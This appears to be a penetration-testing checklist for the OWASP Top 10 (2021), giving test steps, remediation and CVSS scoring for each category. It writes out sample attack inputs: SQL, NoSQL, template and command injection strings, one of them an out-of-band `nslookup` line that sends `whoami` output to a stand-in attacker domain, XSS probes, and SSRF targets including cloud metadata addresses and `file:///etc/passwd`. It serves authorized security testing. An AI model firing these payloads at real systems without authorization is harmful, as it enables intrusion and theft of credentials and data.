# OWASP Top 10 (2021) Checklist

Detailed test procedures, detection patterns, and CVSS guidance for each OWASP Top 10 (2021) category. Pairs with `scripts/vulnerability_scanner.py` — this document is the manual methodology behind the automated checklist output. Use alongside `attack_patterns.md` for concrete payloads and `responsible_disclosure.md` for reporting anything found.

For every category: confirm impact with a non-destructive proof of concept, capture request/response evidence, and score with CVSS 3.1 before writing up the finding (see report format in the main SKILL.md).

---

## A01:2021 — Broken Access Control

Access control failures are the #1 category by prevalence in the 2021 data set (94% of tested apps had some form of broken access control).

**Test steps:**

1. **IDOR/BOLA sweep** — Enumerate every endpoint that takes a resource identifier (`/api/orders/1042`, `/invoices/{id}`, `/users/{id}/profile`). As User A, note your own IDs; as User A, request User B's IDs. Test GET, PUT, PATCH, DELETE — read access is often checked but write/delete is forgotten.
2. **Vertical privilege escalation** — As an authenticated low-privilege user, directly request admin-only endpoints and admin UI routes discovered via JS bundle analysis or `robots.txt`/sitemap. Expect 403; a 200 or 302-to-content is a finding.
3. **Forced browsing / missing function-level checks** — Try accessing endpoints referenced in client-side JS or API specs (Swagger/OpenAPI, GraphQL schema) that aren't linked in the UI. Check for `/admin`, `/internal`, `/.git/config`, `/api/v1/debug`.
4. **CORS misconfiguration** — Send `Origin: https://evil.com` and check if `Access-Control-Allow-Origin` reflects it, especially combined with `Access-Control-Allow-Credentials: true`. That combination lets an attacker's page read authenticated responses.
5. **JWT claim / parameter tampering for authorization** — Modify `user_id`, `tenant_id`, or `role` in a request body or JWT payload (see `attack_patterns.md` for algorithm-confusion payloads) and confirm the server re-validates authorization server-side rather than trusting the client-supplied value.

**Remediation:** Enforce authorization checks server-side on every request (deny by default), use indirect object references or UUIDs plus ownership checks, centralize access-control logic instead of duplicating it per route.

**CVSS notes:** IDOR on sensitive data is typically AV:N/AC:L/PR:L/UI:N/S:U/C:H — often 6.5–8.1 depending on scope; horizontal-to-vertical escalation chains push toward Critical.

---

## A02:2021 — Cryptographic Failures

(Renamed from "Sensitive Data Exposure" in 2021 — this is about the crypto root cause, not just the symptom.)

**Test steps:**

1. **Transport encryption** — Run `nmap --script ssl-enum-ciphers -p 443 target.com` or `testssl.sh target.com`. Flag TLS 1.0/1.1, SSLv3, RC4, 3DES, export ciphers, and missing HSTS (`Strict-Transport-Security` header).
2. **Password storage** — If you have DB/code access (gray/white-box), check the hashing algorithm. Flag MD5, SHA1, unsalted SHA256, or fast general-purpose hashes instead of bcrypt/scrypt/Argon2/PBKDF2 with adequate work factor.
3. **Hardcoded secrets/keys** — Grep source and decompiled mobile/JS bundles for `AKIA`, `-----BEGIN PRIVATE KEY-----`, hardcoded JWT secrets, or API keys (cross-reference with Secret Scanning in the main skill — TruffleHog/Gitleaks).
4. **Weak PRNG for security-sensitive values** — Check whether password-reset tokens, session IDs, or API keys are generated with `Math.random()`, `rand()`, or other non-CSPRNG sources. Test for predictability by requesting several tokens in sequence and looking for patterns.
5. **Sensitive data in transit/at rest without purpose-built protection** — Check if PII/PCI/PHI fields are encrypted at the field level where required, and whether sensitive data leaks into URLs (GET params logged by proxies/browser history) or client-side storage (`localStorage` holding tokens or PII).

**Remediation:** TLS 1.2+ only with strong cipher suites, Argon2id/bcrypt for password hashing, CSPRNG (`crypto.randomBytes`, `secrets` module) for all tokens, secrets in a vault/KMS not source.

**CVSS notes:** Weak TLS alone is usually Medium (4.0–5.9); exposed hardcoded credentials with production access are Critical (9.0+).

---

## A03:2021 — Injection

Merged XSS into this category in 2021.

**Test steps:**

1. **SQL injection** — On every input reflected into a query (including headers like `X-Forwarded-For` and JSON body fields, not just URL params), test error-based (`' OR 1=1--`), boolean-based blind, and time-based blind (`' OR SLEEP(5)--` / `'; WAITFOR DELAY '0:0:5'--`). See `attack_patterns.md` for the full SQLi-to-RCE chain and per-database-engine payloads.
2. **NoSQL injection** — For MongoDB-backed APIs, test operator injection in JSON bodies: `{"username": {"$ne": null}, "password": {"$ne": null}}` on login endpoints.
3. **Command injection** — On any feature that shells out (image conversion, PDF generation, ping/traceroute utilities, file name processing), test metacharacters: `; id`, `| whoami`, `` `id` ``, `$(id)`, and blind variants using `; sleep 5` or out-of-band DNS (`; nslookup $(whoami).attacker-collab.net`).
4. **Server-Side Template Injection (SSTI)** — On fields rendered through a templating engine, test `{{7*7}}` (Jinja2/Twig), `${7*7}` (FreeMarker/EL), `#{7*7}` (Ruby ERB). A returned `49` confirms template injection with likely RCE path.
5. **Cross-Site Scripting (XSS)** — Reflected: inject `<script>alert(document.domain)</script>` and filter-bypass variants into every reflected parameter. Stored: submit payloads in persistent fields (profile bio, comments) and check rendering in other users' sessions. DOM-based: trace `innerHTML`/`document.write` sinks fed by `location.hash`/`location.search` sources.

**Remediation:** Parameterized queries/prepared statements everywhere, ORM query builders instead of string concatenation, output encoding contextual to HTML/JS/URL/attribute, CSP as defense-in-depth, allowlist input validation, disable dangerous template features (autoescape on).

**CVSS notes:** SQLi with data exfiltration is typically 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H); stored XSS in an admin-viewable field can reach Critical via session hijack of privileged users.

---

## A04:2021 — Insecure Design

New category in 2021 — flaws baked into the architecture, not fixable by patching code.

**Test steps:**

1. **Business logic abuse** — Try to reach an end state through an unintended path: apply a discount code multiple times, skip a required approval step by calling a later step's endpoint directly, submit a negative quantity to inflate a refund.
2. **Rate limiting / anti-automation gaps** — Hammer password reset, OTP verification, coupon-code, and account-creation endpoints. Absence of throttling or CAPTCHA after N attempts indicates missing abuse-case design, not just a technical bug.
3. **Multi-step workflow bypass** — In flows with sequential steps (checkout: cart -> shipping -> payment -> confirm), try calling the final step's API directly with a crafted body, skipping payment or identity verification.
4. **Trust boundary violations** — Check whether client-side-only validation (price, discount, permitted actions) is re-validated server-side; resubmit a checkout request with a client-side-modified price.
5. **Resource exhaustion by design** — Test whether the app allows unbounded operations a legitimate design should cap: unlimited file upload size, unbounded pagination (`?limit=999999999`), or recursive/nested payloads (deeply nested JSON/XML) that aren't rejected early.

**Remediation:** Threat model during design (not after), define and test abuse cases alongside use cases, enforce business rules server-side, apply resource limits and rate limits by design.

**CVSS notes:** Business logic flaws often score lower on CVSS despite high business impact — CVSS undervalues logic flaws; note real-world impact explicitly in the report narrative regardless of the number.

---

## A05:2021 — Security Misconfiguration

**Test steps:**

1. **Default/weak credentials** — Test default creds on admin panels, databases, and management interfaces (`admin/admin`, `root/root`, cloud console defaults). Check exposed services: Redis without auth (`redis-cli -h target PING`), MongoDB without auth (`mongo target --eval "db.stats()"`).
2. **Debug mode / verbose errors in production** — Trigger an unhandled exception (malformed input, wrong content-type) and check if stack traces, SQL, or internal paths leak. Look for `X-Powered-By`, framework debug pages (Django `DEBUG=True`, Rails detailed errors, Flask Werkzeug console with PIN).
3. **Missing security headers** — `curl -sI https://target.com | grep -iE "(strict-transport|content-security|x-frame|x-content-type|referrer-policy)"`. Flag missing HSTS, CSP with `unsafe-inline`/`unsafe-eval`, missing `X-Frame-Options`/`frame-ancestors` (clickjacking), missing `X-Content-Type-Options: nosniff`.
4. **Directory listing / exposed files** — Request common sensitive paths: `/.git/config`, `/.env`, `/backup.sql`, `/wp-config.php.bak`, `/.well-known/`, cloud storage buckets left world-readable.
5. **Unnecessary services/features enabled** — Check for enabled HTTP verbs beyond what's needed (`OPTIONS`/`TRACE` — test with `curl -X TRACE`), sample/demo apps left deployed, verbose banner disclosure (`nmap -sV`).

**Remediation:** Hardened baseline configs, disable debug/verbose errors in production, automated header/config scanning in CI, remove default accounts and sample apps, minimal attack surface (disable unused services/ports).

**CVSS notes:** Directory listing exposing secrets or `.env` files with cloud credentials routinely scores Critical due to onward access.

---

## A06:2021 — Vulnerable and Outdated Components

**Test steps:**

1. **Dependency audit** — `npm audit --json`, `pip-audit -r requirements.txt`, `govulncheck ./...`, `bundle audit check --update`. Use `scripts/dependency_auditor.py --file package.json --severity high` for aggregated triage.
2. **Transitive dependency check** — Confirm audits cover the full dependency tree, not just direct deps (`npm ls <pkg>` to trace where a vulnerable transitive package is pulled from).
3. **EOL/unsupported version detection** — Identify components past end-of-life (PHP 7.4, Python 2.x, unsupported Node LTS lines, unpatched WordPress plugins) even if no specific CVE is currently mapped.
4. **Known-CVE fingerprinting on live targets** — Fingerprint server/framework versions via headers, error pages, and JS bundle comments; cross-reference against CVE databases (NVD, GitHub Advisory DB) for that exact version.
5. **Unofficial/unverified sources** — Check for dependencies pulled from forks, unpinned Git refs, or unverifiable package sources — a supply-chain reachability risk even absent a known CVE.

**Remediation:** Automated dependency scanning in CI blocking on critical/high, dependency pinning + lockfiles, scheduled upgrade cadence, remove unused dependencies, subscribe to security advisories for critical components.

**CVSS notes:** Score the known CVE's published base score; if unpublished/self-discovered in a component, score based on actual exploitability in your app's usage context, not the component's worst-case.

---

## A07:2021 — Identification and Authentication Failures

**Test steps:**

1. **Brute force / credential stuffing resistance** — Attempt rapid-fire login attempts against a test account; confirm lockout, exponential backoff, or CAPTCHA triggers, and that lockout doesn't leak whether the username exists (differential responses for valid vs invalid usernames are an enumeration bug).
2. **Session cookie flags** — Inspect `Set-Cookie` headers for `Secure`, `HttpOnly`, and `SameSite` attributes. Missing `HttpOnly` on a session cookie means it's readable by any successful XSS.
3. **Session invalidation** — Log in, capture the session token, log out, then replay the old token. It must be rejected. Also test whether changing password invalidates other active sessions.
4. **MFA bypass** — Check if MFA can be skipped by calling the post-MFA endpoint/state directly, by removing the MFA parameter from the request, or via unlimited OTP brute-force (no rate limit on the 6-digit code).
5. **Weak password policy / credential recovery flaws** — Test minimum password requirements, check if password-reset tokens are long-lived, non-random, or leak identity via response-timing differences, and confirm reset links are single-use and expire.

**Remediation:** MFA on all privileged accounts, secure session management (rotate on privilege change, invalidate server-side on logout), account lockout with backoff, generic error messages that don't leak account existence.

**CVSS notes:** Full auth bypass (e.g., MFA skip) reaching an authenticated account without credentials is typically Critical (9.0+).

---

## A08:2021 — Software and Data Integrity Failures

New category in 2021 — covers insecure deserialization plus CI/CD and update-mechanism integrity.

**Test steps:**

1. **Unsafe deserialization** — Identify serialization formats in use (Java native serialization, Python `pickle`, PHP `unserialize`, .NET `BinaryFormatter`, YAML with unsafe loaders). Test with known gadget-chain payloads (e.g., `ysoserial` for Java) in a controlled lab, never against production without explicit authorization for RCE-level testing.
2. **Subresource Integrity (SRI)** — Check `<script>`/`<link>` tags loading from third-party CDNs for missing `integrity` and `crossorigin` attributes — without SRI, a compromised CDN can inject arbitrary JS.
3. **CI/CD pipeline integrity** — Review whether build pipelines pull dependencies/base images unpinned (`latest` tags, floating version ranges), whether pipeline secrets are exposed to third-party actions/plugins, and whether artifact signing/verification is enforced before deploy.
4. **Auto-update mechanism trust** — For apps with self-update features, confirm updates are delivered over TLS and signature-verified before execution, not just fetched and run.
5. **Insecure CI/CD access control** — Check if PRs from forks can execute pipeline steps with access to production secrets (a common GitHub Actions misconfiguration).

**Remediation:** Avoid native deserialization of untrusted data (prefer JSON with schema validation), enforce SRI on third-party scripts, pin dependency and base-image versions with hash verification, sign build artifacts, restrict CI secret exposure to trusted contexts only.

**CVSS notes:** Deserialization RCE is Critical (9.8-class); CI/CD secret exposure leading to supply-chain compromise should be scored on the blast radius of the exposed credentials, not just the initial finding.

---

## A09:2021 — Security Logging and Monitoring Failures

**Test steps:**

1. **Auth event logging** — Perform a failed login, a successful login, a password change, and a privilege escalation attempt; confirm each is logged with timestamp, source IP, and user identity (with server/log access, or by asking the client to confirm during a gray-box engagement).
2. **Sensitive data in logs** — Trigger flows that submit passwords, tokens, or PII and check whether they appear in plaintext in application or access logs (common bug: full request bodies logged on error, including `Authorization` headers).
3. **Alerting thresholds** — Simulate a brute-force burst or a scan-like pattern of 404s across many paths; confirm whether it triggers any alert (ask the client if using gray-box, or infer from lack of any rate-limiting/blocking response in black-box).
4. **Log tampering resistance** — Check whether logs are shipped to a separate, append-only store versus only living on the application host where an attacker with RCE could delete them.
5. **Incident traceability** — Confirm sufficient log fields exist to reconstruct an attack timeline post-incident (request ID, user ID, IP, timestamp, action) — "we log errors" is not sufficient without security-relevant context.

**Remediation:** Centralized, tamper-resistant logging (SIEM/log aggregator with append-only storage), log security-relevant events (auth, access-control failures, input validation failures) without logging secrets/PII, active alerting on anomalous patterns, defined incident-response runbook tied to alerts.

**CVSS notes:** Logging gaps are rarely scored directly (they're an enabler, not the vulnerability) — report as a finding with business-impact framing ("undetectable breach window") rather than forcing a CVSS score.

---

## A10:2021 — Server-Side Request Forgery (SSRF)

New to the Top 10 list itself in 2021 (previously a sub-issue), reflecting its rise with cloud adoption.

**Test steps:**

1. **Internal network access** — On any feature that fetches a URL server-side (webhooks, "import from URL," PDF/screenshot generators, avatar-from-URL), submit internal targets: `http://127.0.0.1:PORT`, `http://169.254.169.254/`, `http://10.0.0.1`, `http://[::1]`, and internal DNS names guessed from context (`http://internal-api.svc.cluster.local`).
2. **Cloud metadata endpoint access** — Test the cloud-specific metadata IP directly (`169.254.169.254`), see `attack_patterns.md` for the full SSRF-to-credential-theft chain and provider-specific paths (AWS IMDS, GCP, Azure).
3. **Encoding/bypass techniques against naive filters** — If a raw `127.0.0.1`/`localhost` is blocked, test decimal (`http://2130706433/`), octal, hex (`http://0x7f000001/`), IPv6 (`http://[::ffff:127.0.0.1]/`), and DNS rebinding (a domain that resolves to a public IP at validation time then an internal IP at request time).
4. **Protocol smuggling** — Test non-`http(s)` schemes if the fetcher doesn't allowlist protocols: `file:///etc/passwd`, `gopher://`, `dict://` — useful for reaching internal services that speak line-based protocols (Redis, Memcached) via SSRF.
5. **Blind SSRF confirmation** — Where responses aren't reflected, use an out-of-band collaborator domain (Burp Collaborator, `interact.sh`, or your own DNS-logging host) and confirm the server made the outbound request via DNS/HTTP callback logs.

**Remediation:** Allowlist destination hosts/protocols for server-side fetches (deny-by-default), disable redirects on internal-facing fetch clients or re-validate post-redirect, block link-local/metadata ranges at the network layer (require IMDSv2 with hop-limit on AWS), no direct feature access to raw URL fetching without a mediating proxy.

**CVSS notes:** SSRF reaching cloud metadata and extracting IAM credentials is Critical (9.0+) — the metadata theft is typically the pivot to full account compromise, so score the finding based on the achievable blast radius, not just the initial fetch.
